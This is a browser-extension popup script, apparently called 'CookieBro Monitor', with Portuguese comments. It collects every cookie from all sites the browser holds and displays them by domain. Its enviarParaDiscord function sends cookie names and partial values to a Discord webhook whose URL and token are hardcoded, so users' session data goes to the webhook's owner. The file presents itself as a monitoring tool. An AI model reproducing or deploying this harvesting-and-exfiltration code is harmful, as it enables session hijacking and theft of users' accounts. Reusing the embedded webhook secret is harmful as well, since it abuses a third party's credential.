// ============================================================
// COOKIEBRO MONITOR - POPUP INTERATIVO
// ============================================================

const api = chrome || browser;
let cookiesCache = [];
let dominiosCache = [];

// ============================================================
// ELEMENTOS DOM
// ============================================================
const totalCookiesEl = document.getElementById('totalCookies');
const totalDominiosEl = document.getElementById('totalDominios');
const totalSessaoEl = document.getElementById('totalSessao');
const container = document.getElementById('dominiosContainer');
const filtroInput = document.getElementById('filtroDominio');
const timestampEl = document.getElementById('timestamp');
const statusBadge = document.getElementById('statusBadge');

// ============================================================
// FUNÇÃO: Capturar cookies
// ============================================================
function capturarCookies(callback) {
    api.cookies.getAll({}, function(cookies) {
        if (api.runtime.lastError) {
            console.error('Erro ao capturar:', api.runtime.lastError);
            container.innerHTML = `<div class="vazio">❌ Erro ao capturar cookies</div>`;
            return;
        }

        cookiesCache = cookies;
        const dominios = {};

        cookies.forEach(c => {
            const dominio = c.domain || 'desconhecido';
            if (!dominios[dominio]) {
                dominios[dominio] = {
                    total: 0,
                    secure: 0,
                    httpOnly: 0,
                    session: 0,
                    cookies: []
                };
            }
            dominios[dominio].total++;
            dominios[dominio].cookies.push(c);
            if (c.secure) dominios[dominio].secure++;
            if (c.httpOnly) dominios[dominio].httpOnly++;
            if (c.session) dominios[dominio].session++;
        });

        // Ordena por quantidade de cookies (decrescente)
        dominiosCache = Object.entries(dominios)
            .sort((a, b) => b[1].total - a[1].total)
            .map(([dominio, dados]) => ({ dominio, ...dados }));

        // Atualiza stats
        const total = cookies.length;
        const totalDominios = dominiosCache.length;
        const totalSessao = cookies.filter(c => c.session).length;

        totalCookiesEl.textContent = total;
        totalDominiosEl.textContent = totalDominios;
        totalSessaoEl.textContent = totalSessao;

        // Atualiza timestamp
        const agora = new Date();
        timestampEl.textContent = `Última atualização: ${agora.toLocaleTimeString('pt-BR')}`;

        // Atualiza status
        statusBadge.textContent = '';
        statusBadge.style.background = '#43B581';
        statusBadge.style.color = '#0f0f1a';

        renderizarDominios();

        if (callback) callback(cookies);
    });
}

// ============================================================
// FUNÇÃO: Renderizar lista de domínios
// ============================================================
function renderizarDominios() {
    const filtro = filtroInput.value.toLowerCase().trim();
    let filtrados = dominiosCache;

    if (filtro) {
        filtrados = filtrados.filter(d => d.dominio.toLowerCase().includes(filtro));
    }

    if (filtrados.length === 0) {
        container.innerHTML = `<div class="vazio">${filtro ? '🔍 Nenhum domínio encontrado' : '🍪 Nenhum cookie capturado ainda'}</div>`;
        return;
    }

    let html = '';
    filtrados.forEach(d => {
        const safeDomain = d.dominio.replace(/^\./, '');
        const icone = d.dominio.includes('google') ? '🔵' :
                      d.dominio.includes('facebook') ? '🔷' :
                      d.dominio.includes('amazon') ? '🟠' :
                      d.dominio.includes('mercadolivre') ? '🟡' :
                      d.dominio.includes('netflix') ? '🔴' :
                      d.dominio.includes('spotify') ? '🟢' :
                      d.dominio.includes('github') ? '⬛' :
                      d.dominio.includes('microsoft') ? '🟦' : '🌐';

        const sslBadge = d.secure > 0 ? `<span class="badge-ssl">🔒 ${d.secure}</span>` : '';
        const httpBadge = d.httpOnly > 0 ? `<span class="badge-http">🛡️ ${d.httpOnly}</span>` : '';

        html += `
            <div class="dominio-item">
                <span class="nome">
                    <span class="icone">${icone}</span>
                    ${safeDomain}
                    ${sslBadge}
                    ${httpBadge}
                </span>
                <span class="qtd">${d.total}</span>
            </div>
        `;
    });

    container.innerHTML = html;
}

// ============================================================
// FUNÇÃO: Enviar para Discord (manual)
// ============================================================
function enviarParaDiscord() {
    if (cookiesCache.length === 0) {
        alert('⚠️ Nenhum cookie capturado para enviar!');
        return;
    }

    const btn = document.getElementById('btnEnviar');
    btn.textContent = '⏳ Enviando...';
    btn.disabled = true;

    const total = cookiesCache.length;
    const dominios = dominiosCache;
    const amostra = cookiesCache.slice(0, 15).map(c =>
        `${c.domain || '?'} | ${c.name} = ${(c.value || '').substring(0, 30)}...`
    ).join('\n');

    const WEBHOOK = 'https://discord.com/api/webhooks/1547075501384802395/Nit84o6NXdz8EiMJNmNg5WZvo8qH_0PZh8-VFyXGM3RCCrq70hl0W3JeHUziQO5TKlh2';

    fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `📤 **EXPORTAÇÃO MANUAL** - ${new Date().toLocaleString('pt-BR')}`,
            embeds: [{
                title: '📊 Relatório de Cookies',
                color: 0x5865F2,
                fields: [
                    { name: '📦 Total', value: `\`${total}\``, inline: true },
                    { name: '🌐 Domínios', value: `\`${dominios.length}\``, inline: true },
                    { name: '⏳ Sessão', value: `\`${cookiesCache.filter(c => c.session).length}\``, inline: true },
                    { name: '🔒 Secure', value: `\`${cookiesCache.filter(c => c.secure).length}\``, inline: true },
                    { name: '🛡️ HttpOnly', value: `\`${cookiesCache.filter(c => c.httpOnly).length}\``, inline: true },
                    { name: '📋 Amostra', value: `\`\`\`${amostra.substring(0, 1000)}\`\`\``, inline: false }
                ],
                footer: { text: '🔬 CookieBro Monitor' },
                timestamp: new Date().toISOString()
            }]
        })
    })
    .then(r => {
        btn.textContent = '✅ Enviado!';
        btn.style.background = '#43B581';
        setTimeout(() => {
            btn.textContent = '📤 Enviar para Discord';
            btn.style.background = '';
            btn.disabled = false;
        }, 2000);
        if (r.ok) alert('✅ Enviado para o Discord com sucesso!');
        else alert('❌ Erro ao enviar para o Discord.');
    })
    .catch(() => {
        btn.textContent = '❌ Erro';
        btn.style.background = '#F04747';
        setTimeout(() => {
            btn.textContent = '📤 Enviar para Discord';
            btn.style.background = '';
            btn.disabled = false;
        }, 2000);
        alert('❌ Erro ao enviar para o Discord.');
    });
}

// ============================================================
// FUNÇÃO: Exportar CSV
// ============================================================
function exportarCSV() {
    if (cookiesCache.length === 0) {
        alert('⚠️ Nenhum cookie para exportar!');
        return;
    }

    let csv = 'Dominio,Nome,Valor,Secure,HttpOnly,Sessao\n';
    cookiesCache.forEach(c => {
        csv += `"${c.domain || ''}","${c.name}","${(c.value || '').replace(/"/g, '""')}",${c.secure},${c.httpOnly},${c.session}\n`;
    });

    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cookies_${new Date().toISOString().slice(0,10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
}

// ============================================================
// FUNÇÃO: Copiar para clipboard
// ============================================================
function copiarDados() {
    if (cookiesCache.length === 0) {
        alert('⚠️ Nenhum cookie para copiar!');
        return;
    }

    let texto = '🍪 COOKIEBRO MONITOR\n';
    texto += `📊 Total: ${cookiesCache.length} cookies\n`;
    texto += `🌐 Domínios: ${dominiosCache.length}\n`;
    texto += `⏰ ${new Date().toLocaleString('pt-BR')}\n\n`;

    dominiosCache.slice(0, 20).forEach(d => {
        texto += `${d.dominio}: ${d.total} cookies\n`;
        d.cookies.slice(0, 3).forEach(c => {
            texto += `  └── ${c.name} = ${(c.value || '').substring(0, 40)}...\n`;
        });
        if (d.cookies.length > 3) texto += `  └── ... e mais ${d.cookies.length - 3}\n`;
    });

    if (dominiosCache.length > 20) {
        texto += `\n... e mais ${dominiosCache.length - 20} domínios`;
    }

    navigator.clipboard.writeText(texto).then(() => {
        alert('✅ Dados copiados para a área de transferência!');
    }).catch(() => {
        alert('❌ Erro ao copiar.');
    });
}

// ============================================================
// FUNÇÃO: Limpar histórico
// ============================================================
function limparHistorico() {
    if (!confirm('🗑️ Limpar todos os cookies da memória?')) return;
    cookiesCache = [];
    dominiosCache = [];
    totalCookiesEl.textContent = '0';
    totalDominiosEl.textContent = '0';
    totalSessaoEl.textContent = '0';
    container.innerHTML = `<div class="vazio"> Nenhum bixcoito </div>`;
    timestampEl.textContent = 'Última atualização: --';
    statusBadge.textContent = '○ Offline';
    statusBadge.style.background = '#555';
    statusBadge.style.color = '#888';
}

// ============================================================
// INICIALIZAÇÃO
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    // Captura inicial
    capturarCookies();

    // Eventos
    document.getElementById('btnCapturar').addEventListener('click', function() {
        this.textContent = ' Capturando...';
        this.disabled = true;
        capturarCookies(() => {
            this.textContent = ' Capturar';
            this.disabled = false;
        });
    });

    document.getElementById('btnEnviar').addEventListener('click', enviarParaDiscord);
    document.getElementById('btnLimpar').addEventListener('click', limparHistorico);
    document.getElementById('btnExportarCSV').addEventListener('click', exportarCSV);
    document.getElementById('btnCopiar').addEventListener('click', copiarDados);
    document.getElementById('btnAtualizar').addEventListener('click', function() {
        this.textContent = '⏳';
        capturarCookies(() => {
            this.textContent = 'Atualizar';
        });
    });

    filtroInput.addEventListener('input', renderizarDominios);
});